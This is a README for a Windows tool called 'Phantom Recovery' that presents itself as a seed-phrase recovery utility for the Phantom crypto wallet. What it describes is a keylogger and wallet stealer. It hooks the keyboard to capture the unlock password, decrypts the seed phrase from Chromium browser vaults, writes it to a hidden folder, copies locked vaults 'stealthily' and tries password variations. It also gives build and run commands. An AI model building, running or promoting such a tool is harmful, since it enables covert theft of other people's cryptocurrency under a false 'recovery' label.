# Phantom Recovery

Phantom wallet seed phrase recovery tool for Chromium-based browsers and Firefox/LibreWolf.

## How It Works

1. Installs a low-level keyboard hook (WH_KEYBOARD_LL)
2. Detects Phantom wallet unlock popup by window title
3. Captures the password as you type it
4. Opens the Phantom LevelDB vault from the browser profile
5. Decrypts the seed phrase using NaCl secretbox + scrypt/PBKDF2
6. Saves the recovery file to Desktop\PhantomRecovery\

## Browser Support

| Browser | Keyboard Hook | Vault Decryption | Overall |
|---------|---------------|------------------|--------|
| **Chrome** | Yes | Yes (LevelDB) | Full |
| **Edge** | Yes | Yes (LevelDB) | Full |
| **Brave** | Yes | Yes (LevelDB) | Full |
| **Opera/Opera GX** | Yes | Yes (LevelDB) | Full |
| **Vivaldi** | Yes | Yes (LevelDB) | Full |
| **Chromium** | Yes | Yes (LevelDB) | Full |
| **Firefox** | Yes | No (IndexedDB SQLite) | Partial |
| **LibreWolf** | Yes | No (IndexedDB SQLite) | Partial |

### Firefox / LibreWolf Details

The keyboard hook WILL capture passwords typed into Phantom on Firefox/LibreWolf (firefox.exe is detected). However, vault decryption will fail because:

- Firefox stores extension data in IndexedDB SQLite, not LevelDB
- Firefox profile paths differ from Chromium profiles
- The extension ID differs between Chrome Web Store and Mozilla Add-ons

**If you have Phantom on BOTH Chrome and LibreWolf with the same password**, the LibreWolf hook capture will decrypt the Chrome vault.

## Build

```bash
git clone https://github.com/user/phantom-recovery.git
cd phantom-recovery
go build -o phantom_recovery.exe ./cmd/injector/
```

Requirements: Go 1.24+

## Usage

```bash
phantom_recovery.exe
```

1. Run the executable
2. Unlock your Phantom wallet (type password)
3. Seed saved to `Desktop\PhantomRecovery\phantom_seed_TIMESTAMP.txt`
4. Explorer opens to show the file

Debug: set `EXODUS_DEBUG=1` for verbose output.

## Cryptography

Phantom encrypts seed phrases with a two-layer scheme:

1. **Master key**: Derived from password via scrypt (N=4096, r=8, p=1) or PBKDF2-SHA256
2. **Seed key**: Derived from master key via scrypt/PBKDF2 per seed entry
3. **Encryption**: NaCl secretbox (XSalsa20-Poly1305)
4. **Encoding**: All binary fields are Base58-encoded JSON

## Password Variations

Up to 10 variations: original, lowercase, TitleCase, UPPERCASE, strip trailing numbers, append 1/!/123/1234

## Notes

- Windows only
- No network traffic
- Output folder is hidden (attrib +h)
- Supports multiple Phantom accounts
- Vault read via stealth copy (robocopy) if locked

## License

Educational purposes only.